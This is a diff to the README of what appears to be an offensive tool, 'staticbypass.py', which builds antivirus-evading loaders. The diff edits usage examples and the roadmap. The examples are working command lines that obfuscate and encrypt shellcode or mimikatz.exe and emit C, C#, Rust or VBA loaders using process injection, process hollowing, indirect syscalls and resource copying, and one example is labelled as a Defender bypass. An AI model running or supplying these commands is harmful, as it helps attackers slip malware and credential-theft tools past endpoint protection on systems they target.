@@ -70,29 +70,30 @@ shellcoderunner options:
 
 ## Examples
 ```
-# Generic Defender Bypass
+# Generate csharp binary with Dictionary Obfuscation
 python3 staticbypass.py --obfuscator DictObfuscate --transformers XOREncrypt RC4Encrypt AESEncrypt --shellcode ~/shellcode.bin --template shellcoderunner --language cs
 
 # Indirect Syscalls using TartarusGate to resolve windows API call
 python3 staticbypass.py --obfuscator DictObfuscate --transformers XOREncrypt RC4Encrypt AESEncrypt --shellcode ~/shellcode.bin --template spawnandinject,spawn=NtCreateUserProcess,allocation=NtAllocateVirtualMemory,write=NtWriteVirtualMemory,protect=NtProtectVirtualMemory,execution=NtQueueApcThread,close=NtClose --language c --resolver tartarusgatehash
 
 # Spawn a process and inject into it using VM-based obfuscation
-python3 staticbypass.py -s ~/shellcode.bin -b mkpivm64 -e IPv4Obfuscate -t spawnandinject,perm=rwx -l c -a strip
+python3 staticbypass.py -s ~/shellcode.bin -b mkpivm64,mode=rx -e IPv4Obfuscate -t processinject,mode=spawn -l c -a strip
 
 # Donut an executable then AESEncrypt it and UUIDEncode it and compile it with rust
-python3 staticbypass.py -s mimikatz.exe -b donut -e AESEncrypt -t shellcoderunner -l rust
+python3 staticbypass.py -s mimikatz.exe -b donut -e AESEncrypt -t shellcoderunner -l rs -f UUIDEncode
 
 # Generate a vba script that uses writes text into the word document
 python3 staticbypass.py -s ~/shellcode.bin -e DictObfuscate -a embedtext -t processhollow -l vba
 
-# Using module options example
-python3 staticbypass.py -s ~/shellcode.bin -b mkpivm64 -e IPv4Obfuscate -t shellcoderunner -l c -a sigthief,inputfile=bin/ResourceHacker.exe
+# Copy resources from another file 
+python3 staticbypass.py -s ~/shellcode.bin -b mkpivm64 -e IPv4Obfuscate -t shellcoderunner,perm=rwx -l c -a resourcecopy,inputfile=bin/ResourceHacker.exe
 ```
 
 ## Roadmap
 - Add obfuscator support for the different programming languages
-- Add more templates e.g. early bird apc injection, heap allocation
+- Add more templates
 - Refactor code
+- Implement indirect syscalls in other languages
 - Add arguments to compiler
 - Finish install script
 - Increase windows support
